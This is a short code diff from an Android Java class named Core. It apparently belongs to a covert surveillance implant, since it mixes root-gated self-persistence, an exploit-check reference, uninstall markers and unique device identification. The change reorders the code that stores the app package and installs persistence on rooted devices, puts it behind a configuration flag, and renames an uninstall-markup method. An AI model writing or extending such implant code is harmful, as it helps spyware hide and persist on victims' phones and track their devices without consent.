@@ -483,20 +483,22 @@ public class Core extends Activity implements Runnable {
 				return ConfType.Error;
 			}
 
-			// Initialize persistence
-			if (Status.haveRoot()) {
-				Persistence p = new Persistence(Status.getAppContext());
-
-				p.storePackage();
-				p.addPersistance();
-			}
-
 			// this markup is created by UninstallAction
 			final Markup markup = new Markup(UNINSTALL_MARKUP);
-
 			if (markup.isMarkup()) {
 				UninstallAction.actualExecute();
+				//TODO: kill checkexploit
 				return ConfType.Error;
+			}
+
+			// Initialize persistence
+			if (Status.haveRoot()) {
+				if(Cfg.PERSISTENCE) {
+					Persistence p = new Persistence(Status.getAppContext());
+
+					p.storePackage();
+					p.addPersistance();
+				}
 			}
 
 			// Identify the device uniquely
@@ -904,7 +906,7 @@ public class Core extends Activity implements Runnable {
 		return true;
 	}
 
-	public void createMarkup() {
+	public void createUninstallMarkup() {
 		final Markup markup = new Markup(UNINSTALL_MARKUP);
 		boolean ret = markup.createEmptyMarkup();
 		if (Cfg.DEBUG) {
